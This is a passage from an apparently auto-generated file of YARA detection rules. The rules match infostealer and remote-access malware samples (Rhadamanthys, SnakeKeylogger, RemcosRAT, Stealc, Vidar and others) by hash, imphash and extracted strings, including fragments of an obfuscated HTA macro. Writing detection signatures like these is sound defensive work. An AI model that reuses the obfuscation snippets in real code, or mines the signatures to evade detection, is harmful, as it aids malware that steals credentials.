      description = "_subset_batch - from files Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash2 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
      hash3 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash4 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash5 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash6 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
      hash7 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
      hash8 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
   strings:
      $x1 = ".lib section in a.out corruptedbad write barrier buffer boundscall from within the Go runtimecannot assign requested addresscasg" ascii /* score: '51.00'*/
      $x2 = "stopTheWorld: not stopped (status != _Pgcstop)P has cached GC work at end of mark terminationattempting to link in too many shar" ascii /* score: '47.00'*/
      $x3 = "bad lfnode addressbad manualFreeListconnection refusedfile name too longforEachP: not donegarbage collectionidentifier removedin" ascii /* score: '46.00'*/
      $x4 = "GetAddrInfoWGetLastErrorGetLengthSidGetStdHandleGetTempPathWLoadLibraryWReadConsoleWSetEndOfFileTransmitFile_MSpanManualabi mism" ascii /* score: '44.00'*/
      $x5 = "unknown pcws2_32.dll  of size   (targetpc= gcwaiting= gp.status= heap_live= idleprocs= in status  m->mcache= mallocing= ms clock" ascii /* score: '43.00'*/
      $x6 = "object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: gp: gp=runtime: nelems=schedule: in cgo" ascii /* score: '43.00'*/
      $x7 = "address already in useadvapi32.dll not foundargument list too longassembly checks failedbad g->status in readycall not at safe p" ascii /* score: '39.00'*/
      $x8 = "file descriptor in bad statefindrunnable: netpoll with pgchelperstart: bad m->helpgcgcstopm: negative nmspinninginvalid runtime " ascii /* score: '38.00'*/
      $x9 = "ted waitm - semaphore out of syncs.allocCount != s.nelems && freeIndex == s.nelemsattempt to execute system stack code on user s" ascii /* score: '35.00'*/
      $x10 = "bad map stateexchange fullfatal error: gethostbynamegetservbynamekernel32.dll" fullword ascii /* score: '33.00'*/
      $x11 = " MB) workers= called from  gcscanvalid  heap_marked= idlethreads= is nil, not  s.spanclass= span.base()= syscalltick= work.nproc" ascii /* score: '32.00'*/
      $x12 = "atchadvapi32.dllbad g statusbad g0 stackbad recoverycan't happencas64 failedchan receivedumping heapend tracegc" fullword ascii /* score: '32.00'*/
      $s13 = "rkrootruntime: VirtualQuery failed; errno=runtime: bad notifyList size - sync=runtime: invalid pc-encoded table f=runtime: inval" ascii /* score: '30.00'*/
      $s14 = "chemswsock.dllscheddetailsecur32.dllshell32.dlltracealloc(unreachableuserenv.dll [recovered] allocCount  found at *( gcscandone " ascii /* score: '30.00'*/
      $s15 = "p->atomicstatus=CreateSymbolicLinkWCryptReleaseContextGetCurrentProcessIdGetTokenInformationMSpan_Sweep: state=WaitForSingleObje" ascii /* score: '28.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__Rhadamanthys_signature__7c513b4a_59 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature).hta, Rhadamanthys(signature)_7c513b4a.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c4957b3e8d09615172703a9349dcd8c88271ad3f1449154b188cb579a830ba71"
      hash2 = "7c513b4a91a01e467c917065004749df6247c61e8238ef744bbdaec1273ff552"
   strings:
      $s1 = "        tempoString = tempoString & \"B.Rec\"" fullword ascii /* score: '14.00'*/
      $s2 = "Private Sub SetVBOMKey(xlVersion , newValue )" fullword ascii /* score: '13.00'*/
      $s3 = "    ' Various methods here: https://www.motobit.com/tips/detpg_binarytostring/" fullword ascii /* score: '12.00'*/
      $s4 = "        Dim tempoString " fullword ascii /* score: '11.00'*/
      $s5 = "        tempoString = \"ADOD\"" fullword ascii /* score: '11.00'*/
      $s6 = "        tempoString = tempoString & \"ordset\"" fullword ascii /* score: '11.00'*/
      $s7 = "        Set recordSet = CreateObject(tempoString)" fullword ascii /* score: '11.00'*/
      $s8 = "Function getMacroStr27() " fullword ascii /* score: '9.00'*/
      $s9 = "Function getMacroStr19() " fullword ascii /* score: '9.00'*/
      $s10 = "Function getMacroStr5() " fullword ascii /* score: '9.00'*/
      $s11 = "Function getMacroStr23() " fullword ascii /* score: '9.00'*/
      $s12 = "Function getMacroStr9() " fullword ascii /* score: '9.00'*/
      $s13 = "Function getMacroStr21() " fullword ascii /* score: '9.00'*/
      $s14 = "Function getMacroStrTotal()  " fullword ascii /* score: '9.00'*/
      $s15 = "Function getMacroStr7() " fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__d9d3dc366861974d56e9cfc24758d032_imphash__SnakeKeylogger_signature__e1286f2989f2b70b354fe5e33036a_60 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash2 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
   strings:
      $s1 = "MpGetConfigPayloadStatus" fullword ascii /* score: '21.00'*/
      $s2 = "MpGetThreatExecutionInfo" fullword ascii /* score: '21.00'*/
      $s3 = "MpGetCopyAcceleratorProcessStatus" fullword ascii /* score: '20.00'*/
      $s4 = "MpGetAsrBlockedProcesses" fullword ascii /* score: '20.00'*/
      $s5 = "MpImportConfigPayload" fullword ascii /* score: '19.00'*/
      $s6 = "MpElevationHandleAcquire" fullword ascii /* score: '16.00'*/
      $s7 = "MpElevationHandleOpen" fullword ascii /* score: '16.00'*/
      $s8 = "MpElevationHandleActivate" fullword ascii /* score: '16.00'*/
      $s9 = "MpSetUacElevationDefaultWindowHandle" fullword ascii /* score: '16.00'*/
      $s10 = "MpElevationHandleAttach" fullword ascii /* score: '16.00'*/
      $s11 = "MpShutdownCopyAcceleratorProcess" fullword ascii /* score: '15.00'*/
      $s12 = "MpConveyDlpBypass" fullword ascii /* score: '15.00'*/
      $s13 = "MpDlpGetOperationEnforcmentMode" fullword ascii /* score: '14.00'*/
      $s14 = "MpGetEngineVersion" fullword ascii /* score: '12.00'*/
      $s15 = "MpGetRunningMode" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__57b8d1f1_SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c_61 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_57b8d1f1.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_04db5280.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d04cf401.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "57b8d1f1afc63450aff6f6c4a3ac9af5c7f7e1ea8de0187987df2ce051cd2ea5"
      hash2 = "04db52801a029ba84f762b0a3b67266db401976423b729bf13008de64758ab4b"
      hash3 = "d04cf401daa99d9633590e81aa8b4985b7de8193394d1422088ecd68ed933d2a"
   strings:
      $s1 = "john.doe@email.com" fullword wide /* score: '21.00'*/
      $s2 = "jane.smith@email.com" fullword wide /* score: '21.00'*/
      $s3 = "Contact Details - " fullword wide /* score: '12.00'*/
      $s4 = "contacts.xml" fullword wide /* score: '10.00'*/
      $s5 = "First Name,Last Name,Phone,Email,Company,Job Title,Address,Notes" fullword wide /* score: '10.00'*/
      $s6 = "GetAllContacts" fullword ascii /* score: '9.00'*/
      $s7 = "<GetContactById>b__0" fullword ascii /* score: '9.00'*/
      $s8 = "GetContactCount" fullword ascii /* score: '9.00'*/
      $s9 = "<GetAllContacts>b__3_1" fullword ascii /* score: '9.00'*/
      $s10 = "<GetRecentContacts>b__10_0" fullword ascii /* score: '9.00'*/
      $s11 = "GetRecentContacts" fullword ascii /* score: '9.00'*/
      $s12 = "<GetAllContacts>b__3_0" fullword ascii /* score: '9.00'*/
      $s13 = "GetContactById" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__c7269d59926fa4252270f407e4dab043__62 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash3 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash4 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
   strings:
      $s1 = "y failed; errno=runtime: bad notifyList size - sync=runtime: invalid pc-encoded table f=runtime: invalid typeBitsBulkBarrierrunt" ascii /* score: '30.00'*/
      $s2 = "entifier removedindex out of rangeinput/output errormultihop attemptedno child processesno locks availableoperation canceledrunt" ascii /* score: '26.00'*/
      $s3 = "level 3 resetload64 failedmin too largenil stackbaseout of memorypowrprof.dll" fullword ascii /* score: '23.00'*/
      $s4 = "ems && freeIndex == s.nelemsslice bounds out of range [::%x] with capacity %yattempt to execute system stack code on user stackc" ascii /* score: '23.00'*/
      $s5 = "WriteProcessMemorybad manualFreeListconnection refusedfaketimeState.lockfile name too longforEachP: not donegarbage collectionid" ascii /* score: '20.00'*/
      $s6 = "characterpanicwrap: unexpected string after package name: runtime: unexpected waitm - semaphore out of syncs.allocCount != s.nel" ascii /* score: '18.00'*/
      $s7 = "e to parking on channelruntime: CreateIoCompletionPort failed (errno= slice bounds out of range [::%x] with length %yCreateWaita" ascii /* score: '16.00'*/
      $s8 = "ization - linker skewruntime: unable to acquire - semaphore out of syncGC must be disabled to protect validity of fn valuefatal:" ascii /* score: '15.00'*/
      $s9 = "runtime.headTailIndex.tail" fullword ascii /* score: '15.00'*/
      $s10 = " systemstack called from unexpected goroutinepotentially overlapping in-use allocations detectedruntime: netpoll: PostQueuedComp" ascii /* score: '14.00'*/
      $s11 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dllmadvdontneedmheapSpecialmspanSpe" ascii /* score: '14.00'*/
      $s12 = "y unfreed span set block found in resetinvalid memory address or nil pointer dereferenceinvalid or incomplete multibyte or wide " ascii /* score: '12.00'*/
      $s13 = "bleTimerEx when creating timer failedcould not find GetSystemTimeAsFileTime() syscallruntime.preemptM: duplicatehandle failed; e" ascii /* score: '11.00'*/
      $s14 = "sync/atomic.CompareAndSwapInt32.args_stackmap" fullword ascii /* score: '11.00'*/
      $s15 = "sync/atomic.CompareAndSwapInt32" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__96a0774f_RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_63 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_96a0774f.exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f864db9e.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_593b2dd3.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a978e9f0.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e69f506f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "96a0774fc25c036056be449766e6829678457f642381dbbd99525f4866e55f70"
      hash2 = "f864db9e41e3faf0761362b0dcc7c8b5eae9786340ff56effdea61f9af31c006"
      hash3 = "593b2dd3e7a1806f5f97341c297792834c28f57fb95e33c4528c733a9fed4c73"
      hash4 = "a978e9f0e7652cd9c2ce9ea041da1d462ff15cf1fc941c643cec42759205b99b"
      hash5 = "e69f506fb5549fac407a4e5e7c3400e73adfe40329a262771d7bae9a5ab1ba17"
   strings:
      $s1 = "frmLogin" fullword ascii /* score: '15.00'*/
      $s2 = "Login_And_Register_Form" fullword ascii /* score: '15.00'*/
      $s3 = "Login_And_Register_Form.registerForm.resources" fullword ascii /* score: '15.00'*/
      $s4 = "Login_And_Register_Form.Properties.Resources.resources" fullword ascii /* score: '15.00'*/
      $s5 = "Login_And_Register_Form.Properties" fullword ascii /* score: '15.00'*/
      $s6 = "Login_And_Register_Form.frmLogin.resources" fullword ascii /* score: '15.00'*/
      $s7 = "chckbxPassword" fullword ascii /* score: '12.00'*/
      $s8 = "chckbxPassword_CheckedChanged" fullword ascii /* score: '12.00'*/
      $s9 = "3336333$333" fullword ascii /* score: '9.00'*/ /* hex encoded string '36333' */
      $s10 = "PrecisionSoft Technologies" fullword wide /* score: '9.00'*/
      $s11 = "PrecisionSoft Technologies 2025" fullword wide /* score: '9.00'*/
      $s12 = "btnfive" fullword ascii /* score: '8.00'*/
      $s13 = "btnmultiply" fullword ascii /* score: '8.00'*/
      $s14 = "btnthree" fullword ascii /* score: '8.00'*/
      $s15 = "btneight" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d__64 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash3 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
      hash4 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
      hash5 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash6 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash7 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash8 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash9 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
      hash10 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.processorVersionInfo" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.mutexprofilerate" fullword ascii /* score: '21.00'*/
      $s3 = "runtime.execLock" fullword ascii /* score: '19.00'*/
      $s4 = "runtime.printBacklogIndex" fullword ascii /* score: '18.00'*/
      $s5 = "runtime.hashkey" fullword ascii /* score: '16.00'*/
      $s6 = "runtime.sweep" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.printBacklog" fullword ascii /* score: '15.00'*/
      $s8 = "runtime.fastlog2Table" fullword ascii /* score: '15.00'*/
      $s9 = "runtime.faketime" fullword ascii /* score: '15.00'*/
      $s10 = "runtime.data" fullword ascii /* score: '14.00'*/
      $s11 = "runtime.end" fullword ascii /* score: '13.00'*/
      $s12 = "runtime.aeskeysched" fullword ascii /* score: '13.00'*/
      $s13 = "runtime.sig" fullword ascii /* score: '13.00'*/
      $s14 = "runtime.buckhash" fullword ascii /* score: '13.00'*/
      $s15 = "runtime.buildVersion" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Sliver_signature__c2d457ad8ac36fc9f18d45bffcd450c2_imphash__SparkRAT_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__S_65 {
   meta:
      description = "_subset_batch - from files Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash2 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash3 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash4 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.mapiternext" fullword ascii /* score: '10.00'*/
      $s2 = "strconv.baseError" fullword ascii /* score: '10.00'*/
      $s3 = "reflect.cvtRunesString" fullword ascii /* score: '10.00'*/
      $s4 = "compress/flate.(*byLiteral).Len" fullword ascii /* score: '10.00'*/
      $s5 = "strconv.bitSizeError" fullword ascii /* score: '10.00'*/
      $s6 = "compress/flate.byLiteral.Len" fullword ascii /* score: '10.00'*/
      $s7 = "reflect.New" fullword ascii /* score: '10.00'*/
      $s8 = "reflect.Value.runes" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.FuncForPC" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.mapaccessK" fullword ascii /* score: '10.00'*/
      $s11 = "strconv.rangeError" fullword ascii /* score: '10.00'*/
      $s12 = "reflect.Value.setRunes" fullword ascii /* score: '10.00'*/
      $s13 = "compress/flate.(*hcode).set" fullword ascii /* score: '10.00'*/
      $s14 = "reflect.cvtStringRunes" fullword ascii /* score: '10.00'*/
      $s15 = "reflect.makeRunes" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__c7269d59926fa4252270f407e4dab043__66 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash3 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash4 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash5 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash6 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
      hash7 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "os.Executable" fullword ascii /* score: '20.00'*/
      $s2 = "os.executable" fullword ascii /* score: '16.00'*/
      $s3 = "internal/poll.execIO" fullword ascii /* score: '16.00'*/
      $s4 = "os.commandLineToArgv" fullword ascii /* score: '16.00'*/
      $s5 = "internal/poll.(*fdMutex).increfAndClose" fullword ascii /* score: '15.00'*/
      $s6 = "internal/poll.(*fdMutex).decref" fullword ascii /* score: '15.00'*/
      $s7 = "internal/poll.(*fdMutex).rwlock" fullword ascii /* score: '15.00'*/
      $s8 = "internal/poll.(*fdMutex).rwunlock" fullword ascii /* score: '15.00'*/
      $s9 = "*poll.fdMutex" fullword ascii /* score: '15.00'*/
      $s10 = "runtime.netpollblockcommit" fullword ascii /* score: '13.00'*/
      $s11 = "syscall.GetCommandLine" fullword ascii /* score: '11.00'*/
      $s12 = "readbyte" fullword ascii /* score: '11.00'*/
      $s13 = "runtime.createfing" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.SetFinalizer.func1" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.netpollcheckerr" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__d52658fa_SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c_67 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d52658fa.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3f1e1bc2.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5e83e874.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d41022d9.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f0511e05.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d52658fad02bdbdd90eed0d9029e15b6359efe630f786e3ab5875e2a7f3d5056"
      hash2 = "3f1e1bc2b3ac94cbb03ff9942c8753b0a6ea0ce3e6b682727fb013ee873c3d04"
      hash3 = "5e83e874c9e9531fff2a59c1d5c5c559901a6d37bcaaebafdbb915392d1cfb30"
      hash4 = "d41022d91ed5c237cbcb1cfaef080005bf5dae114f06418c873596c6c0149a11"
      hash5 = "f0511e0567f253276f92a19579e7f0e133a28e6ccc5f2b626a623b5e80073b81"
   strings:
      $s1 = "https://www.lipsum.com/" fullword wide /* score: '17.00'*/
      $s2 = "tempora" fullword wide /* score: '15.00'*/
      $s3 = "quaerat" fullword wide /* score: '13.00'*/
      $s4 = "commodo" fullword wide /* score: '11.00'*/
      $s5 = "deserunt" fullword wide /* score: '11.00'*/
      $s6 = "commodi" fullword wide /* score: '11.00'*/
      $s7 = "\"Paragraph Number\",\"Content\",\"Word Count\"" fullword wide /* score: '11.00'*/
      $s8 = "contentFormatter" fullword ascii /* score: '9.00'*/
      $s9 = "ContentFormatter" fullword ascii /* score: '9.00'*/
      $s10 = "consectetur" fullword wide /* score: '8.00'*/
      $s11 = "adipiscing" fullword wide /* score: '8.00'*/
      $s12 = "eiusmod" fullword wide /* score: '8.00'*/
      $s13 = "incididunt" fullword wide /* score: '8.00'*/
      $s14 = "nostrud" fullword wide /* score: '8.00'*/
      $s15 = "exercitation" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3d82589a_RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_68 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3d82589a.exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_75e7eb70.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3d82589a2cde5d52ebec9fbaa01d40c88c6b6f47289ef44b6d11e3070a32036d"
      hash2 = "75e7eb7034018884825716d1b9a2d3ae358bff0ed813884a7fc5c68c70d07210"
   strings:
      $s1 = "\\userscore.bin" fullword wide /* score: '19.00'*/
      $s2 = "GetUserScore" fullword ascii /* score: '17.00'*/
      $s3 = "ProcessWord" fullword ascii /* score: '15.00'*/
      $s4 = "SaveUserScore" fullword ascii /* score: '12.00'*/
      $s5 = "get_EnterKey" fullword ascii /* score: '12.00'*/
      $s6 = "get_BackKey" fullword ascii /* score: '12.00'*/
      $s7 = "get_KeyMatrix" fullword ascii /* score: '12.00'*/
      $s8 = "get_KeyDictionary" fullword ascii /* score: '12.00'*/
      $s9 = "_rectangleLogo" fullword ascii /* score: '9.00'*/
      $s10 = "GetWordList" fullword ascii /* score: '9.00'*/
      $s11 = "get_isFirstTime" fullword ascii /* score: '9.00'*/
      $s12 = "get_restart_alt_FILL0_wght400_GRAD0_opsz48" fullword ascii /* score: '9.00'*/
      $s13 = "get_NumberOfGuesses" fullword ascii /* score: '9.00'*/
      $s14 = "get_restart" fullword ascii /* score: '9.00'*/
      $s15 = "get_GamesPlayed" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphas_69 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9f5e1c5e.exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_aa1badc8.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0003037c.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8317cc0a.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_898fa5e7.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a44128af.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cc1b38c4aa79c03c777b0d99c9ae67fef380572e36f0744d110c18137ce9f3dd"
      hash2 = "9f5e1c5ea05a6275d90bac217e0fd8061c7e87e174b69bcdd26625e873c7579b"
      hash3 = "aa1badc8a65a7e941f3e9e9ed3e7ab9ff565900904e57bcd8e5428c6b900d522"
      hash4 = "0003037c7818733557d04c87095ece05f43dce9f2b571d82ba633181956132a2"
      hash5 = "8317cc0a4d4b4c3776f6f572da2635063a6244f1d9846c8fa8754ab085c555c5"
